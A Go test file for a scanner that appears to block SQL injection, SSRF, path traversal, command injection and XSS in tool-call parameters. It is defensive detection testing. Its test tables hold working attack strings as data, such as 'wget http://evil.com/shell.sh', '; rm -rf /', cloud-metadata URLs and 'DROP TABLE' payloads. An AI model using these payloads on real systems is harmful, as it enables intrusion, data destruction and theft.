package scanner

import (
	"strings"
	"testing"
)

func TestVulnScanner_Nil(t *testing.T) {
	var s *VulnScanner
	blocked, _ := s.Scan("test", "some params")
	if blocked {
		t.Error("nil scanner should not block")
	}
}

func TestVulnScanner_Disabled(t *testing.T) {
	s := NewVulnScanner(&VulnScanConfig{Enabled: false})
	if s != nil {
		t.Error("disabled config should return nil scanner")
	}
}

func TestVulnScanner_ExcludedTool(t *testing.T) {
	s := NewVulnScanner(&VulnScanConfig{
		Enabled:      true,
		Rules:        []string{"sqli"},
		ExcludeTools: []string{"db.query"},
	})
	blocked, _ := s.Scan("db.query", "SELECT * FROM users WHERE id = 1 OR 1=1")
	if blocked {
		t.Error("excluded tool should not be scanned")
	}
}

func TestVulnScanner_SQLi(t *testing.T) {
	s := NewVulnScanner(&VulnScanConfig{
		Enabled: true,
		Rules:   []string{"sqli"},
	})

	tests := []struct {
		name    string
		params  string
		blocked bool
	}{
		// True positives
		{"UNION SELECT", "query SELECT * FROM users UNION SELECT password FROM admin", true},
		{"UNION ALL SELECT", "UNION ALL SELECT 1,2,3 FROM information_schema.tables", true},
		{"OR tautology numeric", "id = 1 OR 1=1", true},
		{"OR tautology string", "name = 'admin' OR 'a'='a'", true},
		{"AND tautology", "WHERE id = 1 AND 1=1", true},
		{"comment truncation single-quote", "admin'-- ", true},
		{"comment truncation semicolon", "admin'; --", true},
		{"stacked query DROP", "1'; DROP TABLE users", true},
		{"stacked query INSERT", "1'; INSERT INTO admin", true},
		{"SLEEP blind SQLi", "1 AND SLEEP(5)", true},
		{"BENCHMARK blind SQLi", "1 AND BENCHMARK(10000000, SHA1('test'))", true},
		{"pg_sleep", "pg_sleep(10)", true},
		{"WAITFOR DELAY", "WAITFOR DELAY '0:0:5'", true},
		{"information_schema probe", "SELECT table_name FROM information_schema.tables", true},
		{"INTO OUTFILE", "SELECT * INTO OUTFILE '/tmp/data.csv'", true},
		{"LOAD_FILE", "SELECT LOAD_FILE('/etc/passwd')", true},
		{"string escape OR", "' OR '1'='1", true},

		// True negatives
		{"normal SELECT", "query SELECT name FROM users WHERE id = 42", false},
		{"normal INSERT", "query INSERT INTO logs (msg) VALUES ('hello world')", false},
		{"natural language", "The user said they want to update or add new data", false},
		{"benign number", "set quantity to 100", false},
		{"benign params", `{"path": "file.txt", "content": "hello world"}`, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			blocked, reason := s.Scan("db.query", tt.params)
			if blocked != tt.blocked {
				t.Errorf("Scan(%q) = blocked:%v, want:%v (reason: %s)", tt.params, blocked, tt.blocked, reason)
			}
		})
	}
}

func TestVulnScanner_SSRF(t *testing.T) {
	s := NewVulnScanner(&VulnScanConfig{
		Enabled: true,
		Rules:   []string{"ssrf"},
	})

	tests := []struct {
		name    string
		params  string
		blocked bool
	}{
		// True positives
		{"localhost", "url http://127.0.0.1/admin", true},
		{"private 10.x", "url http://10.0.0.1/internal", true},
		{"private 172.16.x", "url http://172.16.0.1/secret", true},
		{"private 192.168.x", "url http://192.168.1.1/router", true},
		{"cloud metadata", "url http://169.254.169.254/latest/meta-data/", true},
		{"google metadata", "url http://metadata.google.internal/computeMetadata/v1/", true},
		{"file scheme", "url file:///etc/passwd", true},
		{"gopher scheme", "url gopher://evil.com/attack", true},
		{"dict scheme", "url dict://evil.com:11111/", true},
		{"decimal IP", "url http://2130706433/admin", true},
		{"hex IP", "url http://0x7f000001/admin", true},
		{"IPv6 loopback", "url http://[::1]/admin", true},

		// True negatives
		{"public URL", "url https://api.github.com/repos", false},
		{"another public URL", "url https://example.com/page", false},
		{"no URL", "read file /tmp/test.txt", false},
		{"benign params", `{"query": "search term", "limit": 10}`, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			blocked, reason := s.Scan("web.fetch", tt.params)
			if blocked != tt.blocked {
				t.Errorf("Scan(%q) = blocked:%v, want:%v (reason: %s)", tt.params, blocked, tt.blocked, reason)
			}
		})
	}
}

func TestVulnScanner_PathTraversal(t *testing.T) {
	s := NewVulnScanner(&VulnScanConfig{
		Enabled: true,
		Rules:   []string{"path_traversal"},
	})

	tests := []struct {
		name    string
		params  string
		blocked bool
	}{
		// True positives
		{"dot-dot-slash", "path ../../etc/passwd", true},
		{"dot-dot-backslash", "path ..\\..\\windows\\system32", true},
		{"url encoded", "path %2e%2e%2f%2e%2e%2fetc/passwd", true},
		{"url encoded upper", "path %2E%2E/%2E%2E/etc/passwd", true},
		{"double encoded", "path %252e%252e%252f", true},
		{"null byte", "path file.txt%00.jpg", true},
		{"mixed encoding", "path ..%2f..%2fetc/passwd", true},

		// True negatives
		{"normal path", "path /home/user/documents/file.txt", false},
		{"relative simple", "path ./config.yaml", false},
		{"dots in filename", "path report.2024.01.pdf", false},
		{"benign params", `{"path": "/var/log/app.log"}`, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			blocked, reason := s.Scan("file.read", tt.params)
			if blocked != tt.blocked {
				t.Errorf("Scan(%q) = blocked:%v, want:%v (reason: %s)", tt.params, blocked, tt.blocked, reason)
			}
		})
	}
}

func TestVulnScanner_CommandInjection(t *testing.T) {
	s := NewVulnScanner(&VulnScanConfig{
		Enabled: true,
		Rules:   []string{"command_injection"},
	})

	tests := []struct {
		name    string
		params  string
		blocked bool
	}{
		// True positives
		{"semicolon + rm", "filename test.txt; rm -rf /", true},
		{"pipe to bash", "input hello | bash", true},
		{"pipe to sh", "input data | sh", true},
		{"command substitution dollar", "name $(whoami)", true},
		{"backtick execution", "name `id`", true},
		{"semicolon + chmod", "file test; chmod 777 /etc/passwd", true},
		{"ampersand chain curl", "file test && curl http://evil.com", true},
		{"or chain wget", "file test || wget http://evil.com/shell.sh", true},
		{"newline injection", "query search\nid", true},

		// True negatives
		{"normal filename", "path /home/user/file.txt", false},
		{"normal command arg", "args --verbose --output result.json", false},
		{"benign text", "The quick brown fox jumps over the lazy dog", false},
		{"url with ampersand", "url https://example.com/search?q=test&page=2", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			blocked, reason := s.Scan("system.exec", tt.params)
			if blocked != tt.blocked {
				t.Errorf("Scan(%q) = blocked:%v, want:%v (reason: %s)", tt.params, blocked, tt.blocked, reason)
			}
		})
	}
}

func TestVulnScanner_XSS(t *testing.T) {
	s := NewVulnScanner(&VulnScanConfig{
		Enabled: true,
		Rules:   []string{"xss"},
	})

	tests := []struct {
		name    string
		params  string
		blocked bool
	}{
		// True positives
		{"script tag", `content <script>alert('xss')</script>`, true},
		{"img onerror", `content <img src=x onerror=alert(1)>`, true},
		{"svg onload", `content <svg onload=alert(1)>`, true},
		{"javascript URI", `url javascript:alert(1)`, true},
		{"event handler onclick", `content <div onclick=alert(1)>`, true},
		{"data URI html", `url data:text/html,<script>alert(1)</script>`, true},
		{"expression CSS", `style expression(alert(1))`, true},
		{"event handler onmouseover", `content <a onmouseover=alert(1)>`, true},

		// True negatives
		{"normal HTML", `content <p>Hello, World!</p>`, false},
		{"normal text", "content This is a normal message", false},
		{"code sample mention", "The JavaScript code uses functions", false},
		{"benign params", `{"title": "My Document", "format": "html"}`, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			blocked, reason := s.Scan("web.inject", tt.params)
			if blocked != tt.blocked {
				t.Errorf("Scan(%q) = blocked:%v, want:%v (reason: %s)", tt.params, blocked, tt.blocked, reason)
			}
		})
	}
}

func TestVulnScanner_AllRulesEnabled(t *testing.T) {
	s := NewVulnScanner(&VulnScanConfig{
		Enabled: true,
		// No rules specified = all enabled
	})

	if s == nil {
		t.Fatal("scanner should not be nil when enabled")
	}

	// Should catch SQLi
	blocked, _ := s.Scan("db.query", "1 OR 1=1")
	if !blocked {
		t.Error("all-rules scanner should catch SQLi")
	}

	// Should catch SSRF
	blocked, _ = s.Scan("web.fetch", "url http://169.254.169.254/latest/meta-data/")
	if !blocked {
		t.Error("all-rules scanner should catch SSRF")
	}

	// Should catch path traversal
	blocked, _ = s.Scan("file.read", "../../etc/passwd")
	if !blocked {
		t.Error("all-rules scanner should catch path traversal")
	}

	// Should allow benign
	blocked, _ = s.Scan("read", `{"path": "file.txt"}`)
	if blocked {
		t.Error("all-rules scanner should allow benign request")
	}
}

func TestVulnScanner_SpecificRulesOnly(t *testing.T) {
	// Only enable SQLi — other attack types should pass through
	s := NewVulnScanner(&VulnScanConfig{
		Enabled: true,
		Rules:   []string{"sqli"},
	})

	// SQLi should be caught
	blocked, _ := s.Scan("db.query", "1 OR 1=1")
	if !blocked {
		t.Error("sqli-only scanner should catch SQLi")
	}

	// SSRF should NOT be caught (rule not enabled)
	blocked, _ = s.Scan("web.fetch", "url http://169.254.169.254/latest/meta-data/")
	if blocked {
		t.Error("sqli-only scanner should NOT catch SSRF")
	}

	// Path traversal should NOT be caught
	blocked, _ = s.Scan("file.read", "../../etc/passwd")
	if blocked {
		t.Error("sqli-only scanner should NOT catch path traversal")
	}
}

func TestExtractURLsFromText(t *testing.T) {
	tests := []struct {
		name  string
		text  string
		count int
	}{
		{"single URL", "fetch http://example.com/page", 1},
		{"multiple URLs", "check http://a.com and https://b.com/path", 2},
		{"file URL", "read file:///etc/passwd", 1},
		{"no URLs", "just plain text here", 0},
		{"URL in JSON", `{"url": "https://api.github.com/repos"}`, 1},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			urls := extractURLsFromText(tt.text)
			if len(urls) != tt.count {
				t.Errorf("extractURLsFromText(%q) found %d URLs, want %d", tt.text, len(urls), tt.count)
			}
		})
	}
}

func TestIsDecimalIP(t *testing.T) {
	tests := []struct {
		host string
		want bool
	}{
		{"2130706433", true}, // 127.0.0.1
		{"3232235521", true}, // 192.168.0.1
		{"65535", false},     // Could be a port
		{"example.com", false},
		{"127.0.0.1", false}, // Dotted notation, not decimal
		{"", false},
	}

	for _, tt := range tests {
		t.Run(tt.host, func(t *testing.T) {
			got := isDecimalIP(tt.host)
			if got != tt.want {
				t.Errorf("isDecimalIP(%q) = %v, want %v", tt.host, got, tt.want)
			}
		})
	}
}

func TestVulnScanner_CommandInjection_Extended(t *testing.T) {
	s := NewVulnScanner(&VulnScanConfig{
		Enabled: true,
		Rules:   []string{"command_injection"},
	})

	tests := []struct {
		name    string
		params  string
		blocked bool
	}{
		// Additional true positives
		{"semicolon rm -rf", "test.txt; rm -rf /", true},
		{"pipe cat /etc/passwd", "| cat /etc/passwd", true},
		{"backtick whoami", "`whoami`", true},
		{"dollar paren id", "$(id)", true},
		{"ampersand curl evil", "&& curl evil.com", true},

		// True negatives
		{"echo hello", "echo hello", false},
		{"normal text", "normal text without commands", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			blocked, reason := s.Scan("system.exec", tt.params)
			if blocked != tt.blocked {
				t.Errorf("Scan(%q) = blocked:%v, want:%v (reason: %s)", tt.params, blocked, tt.blocked, reason)
			}
		})
	}
}

func TestVulnScanner_EmptyAndEdgeCases(t *testing.T) {
	s := NewVulnScanner(&VulnScanConfig{Enabled: true})

	tests := []struct {
		name    string
		method  string
		args    string
		blocked bool
	}{
		// Edge cases
		{"empty method string", "", "SELECT * FROM users WHERE id = 1 OR 1=1", true},
		{"valid method empty args", "db.query", "", false},
		{"very long input string", "db.query", "SELECT " + strings.Repeat("a", 10000), false},
		{"unicode in args", "web.fetch", "url http://example.com/éàü", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			blocked, reason := s.Scan(tt.method, tt.args)
			if blocked != tt.blocked {
				t.Errorf("Scan(%q, %q) = blocked:%v, want:%v (reason: %s)", tt.method, tt.args, blocked, tt.blocked, reason)
			}
		})
	}
}

func TestVulnScanner_SSRF_DecimalIP(t *testing.T) {
	s := NewVulnScanner(&VulnScanConfig{
		Enabled: true,
		Rules:   []string{"ssrf"},
	})

	tests := []struct {
		name    string
		params  string
		blocked bool
	}{
		// Decimal IP addresses
		{"decimal 127.0.0.1", "http://2130706433/", true},
		{"decimal 192.168.1.1", "http://3232235777/", true},

		// Public URLs should not be blocked
		{"public URL", "http://example.com", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			blocked, reason := s.Scan("web.fetch", tt.params)
			if blocked != tt.blocked {
				t.Errorf("Scan(%q) = blocked:%v, want:%v (reason: %s)", tt.params, blocked, tt.blocked, reason)
			}
		})
	}
}
